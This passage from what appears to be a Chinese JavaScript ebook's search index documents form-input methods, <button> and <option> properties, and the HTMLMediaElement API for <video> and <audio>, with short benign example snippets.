<li><code>setSelectionRange()</code>\uff1a\u9009\u4e2d<code>&lt;input&gt;</code>\u5143\u7d20\u5185\u90e8\u7684\u4e00\u6bb5\u6587\u672c\uff0c\u4f46\u4e0d\u4f1a\u5c06\u7126\u70b9\u8f6c\u79fb\u5230\u9009\u4e2d\u7684\u6587\u672c\u3002\u8be5\u65b9\u6cd5\u63a5\u53d7\u4e09\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5f00\u59cb\u7684\u4f4d\u7f6e\uff08\u4ece0\u5f00\u59cb\uff09\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u7ed3\u675f\u7684\u4f4d\u7f6e\uff08\u4e0d\u5305\u62ec\u8be5\u4f4d\u7f6e\uff09\uff0c\u7b2c\u4e09\u4e2a\u53c2\u6570\u662f\u53ef\u9009\u7684\uff0c\u8868\u793a\u9009\u62e9\u7684\u65b9\u5411\uff0c\u6709\u4e09\u4e2a\u53ef\u80fd\u7684\u503c\uff08<code>forward</code>\u3001<code>backward</code>\u548c\u9ed8\u8ba4\u503c<code>none</code>\uff09\u3002</li> <li><code>setRangeText()</code>\uff1a\u65b0\u6587\u672c\u66ff\u6362\u9009\u4e2d\u7684\u6587\u672c\u3002\u8be5\u65b9\u6cd5\u63a5\u53d7\u56db\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u65b0\u6587\u672c\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u66ff\u6362\u7684\u5f00\u59cb\u4f4d\u7f6e\uff0c\u7b2c\u4e09\u4e2a\u53c2\u6570\u662f\u7ed3\u675f\u4f4d\u7f6e\uff0c\u7b2c\u56db\u4e2a\u53c2\u6570\u8868\u793a\u66ff\u6362\u540e\u7684\u884c\u4e3a\uff08\u53ef\u9009\uff09\uff0c\u6709\u56db\u4e2a\u53ef\u80fd\u7684\u503c\uff1a<code>select</code>\uff08\u9009\u4e2d\u65b0\u63d2\u5165\u7684\u6587\u672c\uff09\u3001<code>start</code>\uff08\u9009\u4e2d\u7684\u5f00\u59cb\u4f4d\u7f6e\u79fb\u5230\u63d2\u5165\u7684\u6587\u672c\u4e4b\u524d\uff09\u3001<code>end</code>\uff08\u9009\u4e2d\u7684\u6587\u672c\u79fb\u5230\u63d2\u5165\u7684\u6587\u672c\u4e4b\u540e\uff09\u3001<code>preserve</code>\uff08\u4fdd\u7559\u539f\u5148\u9009\u4e2d\u7684\u4f4d\u7f6e\uff0c\u9ed8\u8ba4\u503c\uff09\u3002</li> <li><code>setCustomValidity()</code>\uff1a\u8be5\u65b9\u6cd5\u7528\u4e8e\u81ea\u5b9a\u4e49\u6821\u9a8c\u5931\u8d25\u65f6\u7684\u62a5\u9519\u4fe1\u606f\u3002\u5b83\u7684\u53c2\u6570\u5c31\u662f\u62a5\u9519\u7684\u63d0\u793a\u4fe1\u606f\u3002\u6ce8\u610f\uff0c\u4e00\u65e6\u8bbe\u7f6e\u4e86\u81ea\u5b9a\u4e49\u62a5\u9519\u4fe1\u606f\uff0c\u8be5\u5b57\u6bb5\u5c31\u4e0d\u4f1a\u6821\u9a8c\u901a\u8fc7\u4e86\uff0c\u56e0\u6b64\u7528\u6237\u91cd\u65b0\u8f93\u5165\u65f6\uff0c\u5fc5\u987b\u5c06\u81ea\u5b9a\u4e49\u62a5\u9519\u4fe1\u606f\u8bbe\u4e3a\u7a7a\u5b57\u7b26\u4e32\uff0c\u8bf7\u770b\u4e0b\u9762\u7684\u4f8b\u5b50\u3002</li> <li><code>checkValidity()</code>\uff1a\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5f53\u524d\u8282\u70b9\u7684\u6821\u9a8c\u7ed3\u679c\u3002\u5982\u679c\u8fd4\u56de<code>false</code>\uff0c\u8868\u793a\u4e0d\u6ee1\u8db3\u6821\u9a8c\u8981\u6c42\uff0c\u5426\u5219\u5c31\u662f\u6821\u9a8c\u6210\u529f\u6216\u4e0d\u5fc5\u6821\u9a8c\u3002</li> <li><code>stepDown()</code>\uff1a\u5c06\u5f53\u524d<code>&lt;input&gt;</code>\u8282\u70b9\u7684\u503c\u51cf\u5c11\u4e00\u4e2a\u6b65\u957f\u3002\u8be5\u65b9\u6cd5\u53ef\u4ee5\u63a5\u53d7\u4e00\u4e2a\u6574\u6570<code>n</code>\u4f5c\u4e3a\u53c2\u6570\uff0c\u8868\u793a\u4e00\u6b21\u6027\u51cf\u5c11<code>n</code>\u4e2a\u6b65\u957f\uff0c\u9ed8\u8ba4\u662f<code>1</code>\u3002\u6709\u51e0\u79cd\u60c5\u51b5\u4f1a\u629b\u9519\uff1a\u5f53\u524d<code>&lt;input&gt;</code>\u8282\u70b9\u4e0d\u9002\u5408\u9012\u51cf\u6216\u9012\u589e\u3001\u5f53\u524d\u8282\u70b9\u6ca1\u6709<code>step</code>\u5c5e\u6027\u3001<code>&lt;input&gt;</code>\u8282\u70b9\u7684\u503c\u4e0d\u80fd\u8f6c\u4e3a\u6570\u5b57\u3001\u9012\u51cf\u4e4b\u540e\u7684\u503c\u5c0f\u4e8e<code>min</code>\u5c5e\u6027\u6216\u5927\u4e8e<code>max</code>\u5c5e\u6027\u3002</li> <li><code>stepUp()</code>\uff1a\u5c06\u5f53\u524d<code>&lt;input&gt;</code>\u8282\u70b9\u7684\u503c\u589e\u52a0\u4e00\u4e2a\u6b65\u957f\u3002\u5176\u4ed6\u4e0e<code>stepDown()</code>\u65b9\u6cd5\u76f8\u540c\u3002</li> </ul> <p>\u4e0b\u9762\u662f<code>setSelectionRange()</code>\u65b9\u6cd5\u7684\u4e00\u4e2a\u4f8b\u5b50\u3002</p> <pre><code>/* HTML \u4ee3\u7801\u5982\u4e0b\n  &lt;p&gt;&lt;input type=\"text\" id=\"mytextbox\" size=\"20\" value=\"HelloWorld\"/&gt;&lt;/p&gt;\n  &lt;p&gt;&lt;button onclick=\"SelectText()\"&gt;\u9009\u62e9\u6587\u672c&lt;/button&gt;&lt;/p&gt;\n*/\n\nfunction SelectText() {\n  var input = document.getElementById('mytextbox');\n  input.focus();\n  input.setSelectionRange(2, 5);\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u70b9\u51fb\u6309\u94ae\u4ee5\u540e\uff0c\u4f1a\u9009\u4e2d<code>llo</code>\u4e09\u4e2a\u5b57\u7b26\u3002</p> <p>\u4e0b\u9762\u662f<code>setCustomValidity()</code>\u7684\u4f8b\u5b50\u3002</p> <pre><code>/* HTML \u4ee3\u7801\u5982\u4e0b\n  &lt;form id=\"form\"&gt;\n    &lt;input id=\"field\" type=\"text\" pattern=\"[a-f,0-9]{4}\" autocomplete=off&gt;\n  &lt;/form&gt;\n*/\n\nconst form   = document.querySelector('#form');\nconst field  = document.querySelector('#field');\n\nform.addEventListener('submit', (e) =&gt; {\n  e.preventDefault(); // \u9632\u6b62\u8fd9\u4e2a\u4f8b\u5b50\u53d1\u51fa POST \u8bf7\u6c42\n});\n\nfield.oninvalid = (event) =&gt; {\n  event.target.setCustomValidity('\u5fc5\u987b\u662f\u4e00\u4e2a 4 \u4f4d\u5341\u516d\u8fdb\u5236\u6570');\n}\n\nfield.oninput = (event) =&gt; {\n  event.target.setCustomValidity('');\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u8f93\u5165\u6846\u5fc5\u987b\u8f93\u5165\u4e00\u4e2a4\u4f4d\u7684\u5341\u516d\u8fdb\u5236\u6570\u3002\u5982\u679c\u4e0d\u6ee1\u8db3\u6761\u4ef6\uff08\u6bd4\u5982\u8f93\u5165<code>xxx</code>\uff09\uff0c\u6309\u4e0b\u56de\u8f66\u952e\u4ee5\u540e\uff0c\u5c31\u4f1a\u63d0\u793a\u81ea\u5b9a\u4e49\u7684\u62a5\u9519\u4fe1\u606f\u3002\u4e00\u65e6\u81ea\u5b9a\u4e49\u4e86\u62a5\u9519\u4fe1\u606f\uff0c\u8f93\u5165\u6846\u5c31\u4f1a\u4e00\u76f4\u5904\u4e8e\u6821\u9a8c\u5931\u8d25\u72b6\u6001\uff0c\u56e0\u6b64\u91cd\u65b0\u8f93\u5165\u65f6\uff0c\u5fc5\u987b\u628a\u81ea\u5b9a\u4e49\u62a5\u9519\u4fe1\u606f\u8bbe\u4e3a\u7a7a\u5b57\u7b26\u4e32\u3002\u53e6\u5916\uff0c\u4e3a\u4e86\u907f\u514d\u81ea\u52a8\u8865\u5168\u63d0\u793a\u6846\u906e\u4f4f\u62a5\u9519\u4fe1\u606f\uff0c\u5fc5\u987b\u5c06\u8f93\u5165\u6846\u7684<code>autocomplete</code>\u5c5e\u6027\u5173\u95ed\u3002</p>"},{"location":"ebook-JS-basic/11-%E7%BD%91%E9%A1%B5%E5%85%83%E7%B4%A0%E6%8E%A5%E5%8F%A3/#button","title":"<code>&lt;button&gt;</code>","text":"<p><code>&lt;button&gt;</code>\u5143\u7d20\u7ee7\u627f\u4e86<code>HTMLButtonElement</code>\u63a5\u53e3\u3002\u5c5e\u6027\uff1a</p> <pre><code>button.accessKey\nbutton.autofocus\nbutton.disabled\nbutton.form\nbutton.formAction\nbutton.formEnctype 'application/x-www-form-urlencoded' 'multipart/form-data' 'text/plain'\nbutton.formMethod\nbutton.formNoValidate \u8868\u793a\u70b9\u51fb\u6309\u94ae\u63d0\u4ea4\u8868\u5355\u65f6\uff0c\u662f\u5426\u8981\u8df3\u8fc7\u8868\u5355\u6821\u9a8c\u7684\u6b65\u9aa4\nbutton.formTarget\nbutton.labels\nbutton.name\nbutton.tabIndex\nbutton.type 'submit' 'reset' 'button'\nbutton.validationMessage\nbutton.validity\nbutton.value\nbutton.willValidate\n</code></pre>"},{"location":"ebook-JS-basic/11-%E7%BD%91%E9%A1%B5%E5%85%83%E7%B4%A0%E6%8E%A5%E5%8F%A3/#option","title":"<code>&lt;option&gt;</code>","text":"<p><code>&lt;option&gt;</code>\u5143\u7d20\u8868\u793a\u4e0b\u62c9\u6846\uff08<code>&lt;select&gt;</code>\uff0c<code>&lt;optgroup&gt;</code>\u6216<code>&lt;datalist&gt;</code>\uff09\u91cc\u9762\u7684\u4e00\u4e2a\u9009\u9879\u3002\u4e3b\u8981\u5c5e\u6027</p> <pre><code>option.disabled\noption.defaultSelected\noption.form\noption.index\noption.selected\noption.text\noption.value\n</code></pre> <p>\u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b<code>Option()</code>\u6784\u9020\u51fd\u6570\uff0c\u7528\u6765\u751f\u6210 HTMLOptionElement \u5b9e\u4f8b\u3002</p> <pre><code>new Option(text, value, defaultSelected, selected);\nlet newOption = new Option('hello','10', true, false);\n</code></pre> <p>\u5b83\u63a5\u53d7\u56db\u4e2a\u53c2\u6570\uff0c\u90fd\u662f\u53ef\u9009\u7684\u3002</p> <ul> <li>text\uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8be5\u9009\u9879\u7684\u6587\u672c\u5185\u5bb9\u3002\u5982\u679c\u7701\u7565\uff0c\u8fd4\u56de\u7a7a\u5b57\u7b26\u4e32\u3002</li> <li>value\uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8be5\u9009\u9879\u7684\u503c\u3002\u5982\u679c\u7701\u7565\uff0c\u9ed8\u8ba4\u8fd4\u56de<code>text</code>\u5c5e\u6027\u7684\u503c\u3002</li> <li>defaultSelected\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8be5\u9879\u662f\u5426\u9ed8\u8ba4\u9009\u4e2d\uff0c\u9ed8\u8ba4\u4e3a<code>false</code>\u3002\u6ce8\u610f\uff0c\u5373\u4f7f\u8bbe\u4e3a<code>true</code>\uff0c\u4e5f\u4e0d\u4ee3\u8868\u8be5\u9879\u7684<code>selected</code>\u5c5e\u6027\u4e3a<code>true</code>\u3002</li> <li>selected\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8be5\u9879\u662f\u5426\u9009\u4e2d\uff0c\u9ed8\u8ba4\u4e3a<code>false</code>\u3002</li> </ul>"},{"location":"ebook-JS-basic/11-%E7%BD%91%E9%A1%B5%E5%85%83%E7%B4%A0%E6%8E%A5%E5%8F%A3/#videoaudio","title":"<code>&lt;video&gt;&lt;audio&gt;</code>","text":""},{"location":"ebook-JS-basic/11-%E7%BD%91%E9%A1%B5%E5%85%83%E7%B4%A0%E6%8E%A5%E5%8F%A3/#_12","title":"\u6982\u8ff0","text":"<p><code>&lt;video&gt;</code>\u5143\u7d20\u7528\u6765\u52a0\u8f7d\u89c6\u9891\uff0c\u662fHTMLVideoElement\u5bf9\u8c61\u7684\u5b9e\u4f8b\u3002</p> <p><code>&lt;audio&gt;</code>\u5143\u7d20\u7528\u6765\u52a0\u8f7d\u97f3\u9891\uff0c\u662fHTMLAudioElement\u5bf9\u8c61\u7684\u5b9e\u4f8b\u3002</p> <p>\u800cHTMLVideoElement\u548cHTMLAudioElement\u90fd\u7ee7\u627f\u4e86HTMLMediaElement\uff0c\u6240\u4ee5\u8fd9\u4e24\u4e2a HTML \u5143\u7d20\u6709\u8bb8\u591a\u5171\u540c\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\uff0c\u53ef\u4ee5\u653e\u5728\u4e00\u8d77\u4ecb\u7ecd\u3002</p> <p>\u7406\u8bba\u4e0a\uff0c\u8fd9\u4e24\u4e2a HTML \u5143\u7d20\u76f4\u63a5\u7528<code>src</code>\u5c5e\u6027\u6307\u5b9a\u5a92\u4f53\u6587\u4ef6\uff0c\u5c31\u53ef\u4ee5\u4f7f\u7528\u4e86\u3002</p> <pre><code>&lt;audio src=\"background_music.mp3\" controls=\"true\"/&gt;\n&lt;video src=\"news.mov\" width=320 height=240 controls=\"true\"/&gt;\n</code></pre> <p>\u6ce8\u610f\uff0c<code>&lt;video&gt;</code>\u5143\u7d20\u6709<code>width</code>\u5c5e\u6027\u548c<code>height</code>\u5c5e\u6027\uff0c\u53ef\u4ee5\u6307\u5b9a\u5bbd\u548c\u9ad8\u3002<code>&lt;audio&gt;</code>\u5143\u7d20\u6ca1\u6709\u8fd9\u4e24\u4e2a\u5c5e\u6027\uff0c\u56e0\u4e3a\u5b83\u7684\u64ad\u653e\u5668\u5916\u5f62\u662f\u6d4f\u89c8\u5668\u7ed9\u5b9a\u7684\uff0c\u4e0d\u80fd\u6307\u5b9a\u3002</p> <p>\u5b9e\u9645\u4e0a\uff0c\u4e0d\u540c\u7684\u6d4f\u89c8\u5668\u652f\u6301\u4e0d\u540c\u7684\u5a92\u4f53\u683c\u5f0f\uff0c\u6211\u4eec\u4e0d\u5f97\u4e0d\u7528<code>&lt;source&gt;</code>\u5143\u7d20\u6307\u5b9a\u540c\u4e00\u4e2a\u5a92\u4f53\u6587\u4ef6\u7684\u4e0d\u540c\u683c\u5f0f\uff0c\u6d4f\u89c8\u5668\u9047\u5230\u652f\u6301\u7684\u683c\u5f0f\uff0c\u5c31\u4f1a\u5ffd\u7565\u540e\u9762\u7684\u683c\u5f0f\u3002\u8fd9\u91cc\u53ef\u4ee5\u89e3\u51b3\u517c\u5bb9\u6027\u3002</p> <pre><code>&lt;audio id=\"music\"&gt;\n  &lt;source src=\"music.mp3\" type=\"audio/mpeg\"&gt;  \n  &lt;source src=\"music.ogg\" type='audio/ogg; codec=\"vorbis\"'&gt;\n&lt;/audio&gt;\n</code></pre>"},{"location":"ebook-JS-basic/11-%E7%BD%91%E9%A1%B5%E5%85%83%E7%B4%A0%E6%8E%A5%E5%8F%A3/#mediaapi","title":"Media\u516c\u5171API","text":"<p><code>HTMLMediaElement</code>\u5e76\u6ca1\u6709\u5bf9\u5e94\u7684 HTML \u5143\u7d20\uff0c\u800c\u662f\u4f5c\u4e3a<code>&lt;video&gt;</code>\u548c<code>&lt;audio&gt;</code>\u7684\u57fa\u7c7b\uff0c\u5b9a\u4e49\u4e00\u4e9b\u5b83\u4eec\u5171\u540c\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u3002</p> <p>\u5c5e\u6027</p> <ul> <li>HTMLMediaElement.audioTracks\uff1a\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u8868\u793a\u5a92\u4f53\u6587\u4ef6\u5305\u542b\u7684\u97f3\u8f68\u3002</li> <li>HTMLMediaElement.autoplay\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5a92\u4f53\u6587\u4ef6\u662f\u5426\u81ea\u52a8\u64ad\u653e\uff0c\u5bf9\u5e94 HTML \u5c5e\u6027<code>autoplay</code>\u3002</li> <li>HTMLMediaElement.buffered\uff1a\u8fd4\u56de\u4e00\u4e2a TimeRanges \u5bf9\u8c61\uff0c\u8868\u793a\u6d4f\u89c8\u5668\u7f13\u51b2\u7684\u5185\u5bb9\u3002\u8be5\u5bf9\u8c61\u7684<code>length</code>\u5c5e\u6027\u8fd4\u56de\u7f13\u5b58\u91cc\u9762\u6709\u591a\u5c11\u6bb5\u5185\u5bb9\uff0c<code>start(rangeId)</code>\u65b9\u6cd5\u8fd4\u56de\u6307\u5b9a\u7684\u67d0\u6bb5\u5185\u5bb9\uff08\u4ece0\u5f00\u59cb\uff09\u5f00\u59cb\u7684\u65f6\u95f4\u70b9\uff0c<code>end()</code>\u8fd4\u56de\u6307\u5b9a\u7684\u67d0\u6bb5\u5185\u5bb9\u7ed3\u675f\u7684\u65f6\u95f4\u70b9\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002</li> <li>HTMLMediaElement.controls\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u662f\u5426\u663e\u793a\u5a92\u4f53\u6587\u4ef6\u7684\u63a7\u5236\u680f\uff0c\u5bf9\u5e94 HTML \u5c5e\u6027<code>controls</code>\u3002</li> <li>HTMLMediaElement.controlsList\uff1a\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u8868\u793a\u662f\u5426\u663e\u793a\u63a7\u5236\u680f\u7684\u67d0\u4e9b\u63a7\u4ef6\u3002\u8be5\u5bf9\u8c61\u5305\u542b\u4e09\u4e2a\u53ef\u80fd\u7684\u503c\uff1a<code>nodownload</code>\u3001<code>nofullscreen</code>\u548c<code>noremoteplayback</code>\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002</li> <li>HTMLMediaElement.crossOrigin\uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8de8\u57df\u8bf7\u6c42\u65f6\u662f\u5426\u9644\u5e26\u7528\u6237\u4fe1\u606f\uff08\u6bd4\u5982 Cookie\uff09\uff0c\u5bf9\u5e94 HTML \u5c5e\u6027<code>crossorigin</code>\u3002\u8be5\u5c5e\u6027\u53ea\u6709\u4e24\u4e2a\u53ef\u80fd\u7684\u503c\uff1a<code>anonymous</code>\u548c<code>use-credentials</code>\u3002</li> <li>HTMLMediaElement.currentSrc\uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5f53\u524d\u6b63\u5728\u64ad\u653e\u7684\u5a92\u4f53\u6587\u4ef6\u7684\u7edd\u5bf9\u8def\u5f84\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002</li> <li>HTMLMediaElement.currentTime\uff1a\u6d6e\u70b9\u6570\uff0c\u8868\u793a\u5f53\u524d\u64ad\u653e\u7684\u65f6\u95f4\u70b9\u3002</li> <li>HTMLMediaElement.defaultMuted\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u9ed8\u8ba4\u662f\u5426\u5173\u95ed\u97f3\u91cf\uff0c\u5bf9\u5e94 HTML \u5c5e\u6027<code>muted</code>\u3002</li> <li>HTMLMediaElement.defaultPlaybackRate\uff1a\u6d6e\u70b9\u6570\uff0c\u8868\u793a\u9ed8\u8ba4\u7684\u64ad\u653e\u901f\u7387\uff0c\u9ed8\u8ba4\u662f1.0\u3002</li> <li>HTMLMediaElement.disableRemotePlayback\uff1a\u5e03\u5c14\u503c\uff0c\u662f\u5426\u5141\u8bb8\u8fdc\u7a0b\u56de\u653e\uff0c\u5373\u8fdc\u7a0b\u56de\u653e\u7684\u65f6\u5019\u662f\u5426\u4f1a\u6709\u5de5\u5177\u680f\u3002</li> <li>HTMLMediaElement.duration\uff1a\u6d6e\u70b9\u6570\uff0c\u8868\u793a\u5a92\u4f53\u6587\u4ef6\u7684\u65f6\u95f4\u957f\u5ea6\uff08\u5355\u4f4d\u79d2\uff09\u3002\u5982\u679c\u5f53\u524d\u6ca1\u6709\u5a92\u4f53\u6587\u4ef6\uff0c\u8be5\u5c5e\u6027\u8fd4\u56de0\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002</li> <li>HTMLMediaElement.ended\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5f53\u524d\u5a92\u4f53\u6587\u4ef6\u662f\u5426\u5df2\u7ecf\u64ad\u653e\u7ed3\u675f\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002</li> <li>HTMLMediaElement.error\uff1a\u8fd4\u56de\u6700\u8fd1\u4e00\u6b21\u62a5\u9519\u7684\u9519\u8bef\u5bf9\u8c61\uff0c\u5982\u679c\u6ca1\u6709\u62a5\u9519\uff0c\u8fd4\u56de<code>null</code>\u3002</li> <li>HTMLMediaElement.loop\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5a92\u4f53\u6587\u4ef6\u662f\u5426\u4f1a\u5faa\u73af\u64ad\u653e\uff0c\u5bf9\u5e94 HTML \u5c5e\u6027<code>loop</code>\u3002</li> <li>HTMLMediaElement.muted\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u97f3\u91cf\u662f\u5426\u5173\u95ed\u3002</li> <li>HTMLMediaElement.networkState\uff1a\u5f53\u524d\u7f51\u7edc\u72b6\u6001\uff0c\u5171\u6709\u56db\u4e2a\u53ef\u80fd\u7684\u503c\u30020\u8868\u793a\u6ca1\u6709\u6570\u636e\uff1b1\u8868\u793a\u5a92\u4f53\u5143\u7d20\u5904\u5728\u6fc0\u6d3b\u72b6\u6001\uff0c\u4f46\u662f\u8fd8\u6ca1\u5f00\u59cb\u4e0b\u8f7d\uff1b2\u8868\u793a\u4e0b\u8f7d\u4e2d\uff1b3\u8868\u793a\u6ca1\u6709\u627e\u5230\u5a92\u4f53\u6587\u4ef6\u3002</li> <li>HTMLMediaElement.paused\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5a92\u4f53\u6587\u4ef6\u662f\u5426\u5904\u5728\u6682\u505c\u72b6\u6001\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002</li> <li>HTMLMediaElement.playbackRate\uff1a\u6d6e\u70b9\u6570\uff0c\u8868\u793a\u5a92\u4f53\u6587\u4ef6\u7684\u64ad\u653e\u901f\u5ea6\uff0c1.0\u662f\u6b63\u5e38\u901f\u5ea6\u3002\u5982\u679c\u662f\u8d1f\u6570\uff0c\u8868\u793a\u5411\u540e\u64ad\u653e\u3002</li> <li>HTMLMediaElement.played\uff1a\u8fd4\u56de\u4e00\u4e2a TimeRanges \u5bf9\u8c61\uff0c\u8868\u793a\u64ad\u653e\u7684\u5a92\u4f53\u5185\u5bb9\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002</li> <li>HTMLMediaElement.preload\uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5e94\u8be5\u9884\u52a0\u8f7d\u54ea\u4e9b\u5185\u5bb9\uff0c\u53ef\u80fd\u7684\u503c\u4e3a<code>none</code>\u3001<code>metadata</code>\u548c<code>auto</code>\u3002</li> <li>HTMLMediaElement.readyState\uff1a\u6574\u6570\uff0c\u8868\u793a\u5a92\u4f53\u6587\u4ef6\u7684\u51c6\u5907\u72b6\u6001\uff0c\u53ef\u80fd\u7684\u503c\u4e3a0\uff08\u6ca1\u6709\u4efb\u4f55\u6570\u636e\uff09\u30011\uff08\u5df2\u83b7\u53d6\u5143\u6570\u636e\uff09\u30012\uff08\u53ef\u64ad\u653e\u5f53\u524d\u5e27\uff0c\u4f46\u4e0d\u8db3\u4ee5\u64ad\u653e\u591a\u4e2a\u5e27\uff09\u30013\uff08\u53ef\u4ee5\u64ad\u653e\u591a\u5e27\uff0c\u81f3\u5c11\u4e3a\u4e24\u5e27\uff09\u30014\uff08\u53ef\u4ee5\u6d41\u7545\u64ad\u653e\uff09\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002</li> <li>HTMLMediaElement.seekable\uff1a\u8fd4\u56de\u4e00\u4e2a TimeRanges \u5bf9\u8c61\uff0c\u8868\u793a\u4e00\u4e2a\u7528\u6237\u53ef\u4ee5\u641c\u7d22\u7684\u5a92\u4f53\u5185\u5bb9\u8303\u56f4\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002</li> <li>HTMLMediaElement.seeking\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5a92\u4f53\u6587\u4ef6\u662f\u5426\u6b63\u5728\u5bfb\u627e\u65b0\u4f4d\u7f6e\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002</li> <li>HTMLMediaElement.src\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5a92\u4f53\u6587\u4ef6\u7684 URL\uff0c\u5bf9\u5e94 HTML \u5c5e\u6027<code>src</code>\u3002</li> <li>HTMLMediaElement.srcObject\uff1a\u8fd4\u56de<code>src</code>\u5c5e\u6027\u5bf9\u5e94\u7684\u5a92\u4f53\u6587\u4ef6\u8d44\u6e90\uff0c\u53ef\u80fd\u662f<code>MediaStream</code>\u3001<code>MediaSource</code>\u3001<code>Blob</code>\u6216<code>File</code>\u5bf9\u8c61\u3002\u76f4\u63a5\u6307\u5b9a\u8fd9\u4e2a\u5c5e\u6027\uff0c\u5c31\u53ef\u4ee5\u64ad\u653e\u5a92\u4f53\u6587\u4ef6\u3002</li> <li>HTMLMediaElement.textTracks\uff1a\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u5305\u542b\u6240\u6709\u6587\u672c\u8f68\u9053\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002</li> <li>HTMLMediaElement.videoTracks\uff1a\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u5305\u542b\u591a\u6709\u89c6\u9891\u8f68\u9053\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002</li> <li>HTMLMediaElement.volume\uff1a\u6d6e\u70b9\u6570\uff0c\u8868\u793a\u97f3\u91cf\u30020.0 \u8868\u793a\u9759\u97f3\uff0c1.0 \u8868\u793a\u6700\u5927\u97f3\u91cf\u3002</li> </ul> <p>\u65b9\u6cd5</p> <ul> <li>HTMLMediaElement.addTextTrack()\uff1a\u6dfb\u52a0\u6587\u672c\u8f68\u9053\uff08\u6bd4\u5982\u5b57\u5e55\uff09\u5230\u5a92\u4f53\u6587\u4ef6\u3002</li> <li>HTMLMediaElement.captureStream()\uff1a\u8fd4\u56de\u4e00\u4e2a MediaStream \u5bf9\u8c61\uff0c\u7528\u6765\u6355\u83b7\u5f53\u524d\u5a92\u4f53\u6587\u4ef6\u7684\u6d41\u5185\u5bb9\u3002</li> <li>HTMLMediaElement.canPlayType()\uff1a\u8be5\u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a MIME \u5b57\u7b26\u4e32\u4f5c\u4e3a\u53c2\u6570\uff0c\u7528\u6765\u5224\u65ad\u8fd9\u79cd\u7c7b\u578b\u7684\u5a92\u4f53\u6587\u4ef6\u662f\u5426\u53ef\u4ee5\u64ad\u653e\u3002\u8be5\u53cd\u590d\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u6709\u4e09\u79cd\u53ef\u80fd\u7684\u503c\uff0c<code>probably</code>\u8868\u793a\u4f3c\u4e4e\u53ef\u64ad\u653e\uff0c<code>maybe</code>\u8868\u793a\u65e0\u6cd5\u5728\u4e0d\u64ad\u653e\u7684\u60c5\u51b5\u4e0b\u5224\u65ad\u662f\u5426\u53ef\u64ad\u653e\uff0c\u7a7a\u5b57\u7b26\u4e32\u8868\u793a\u65e0\u6cd5\u64ad\u653e\u3002</li> <li>HTMLMediaElement.fastSeek()\uff1a\u8be5\u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a\u6d6e\u70b9\u6570\u4f5c\u4e3a\u53c2\u6570\uff0c\u8868\u793a\u6307\u5b9a\u7684\u65f6\u95f4\uff08\u5355\u4f4d\u79d2\uff09\u3002\u8be5\u65b9\u6cd5\u5c06\u5a92\u4f53\u6587\u4ef6\u79fb\u52a8\u5230\u6307\u5b9a\u65f6\u95f4\u3002</li> <li>HTMLMediaElement.load()\uff1a\u91cd\u65b0\u52a0\u8f7d\u5a92\u4f53\u6587\u4ef6\u3002</li> <li>HTMLMediaElement.pause()\uff1a\u6682\u505c\u64ad\u653e\u3002\u8be5\u65b9\u6cd5\u6ca1\u6709\u8fd4\u56de\u503c\u3002</li> <li>HTMLMediaElement.play()\uff1a\u5f00\u59cb\u64ad\u653e\u3002\u8be5\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a Promise \u5bf9\u8c61\u3002</li> </ul> <p>\u4e0b\u9762\u662f<code>play()</code>\u65b9\u6cd5\u7684\u4e00\u4e2a\u4f8b\u5b50\u3002</p> <pre><code>let myVideo = docuement.getElementById('video-me');\n\nmyVideo.play().then(() =&gt; {\n  console.log('playing')\n}).catch((e) =&gt; {\n  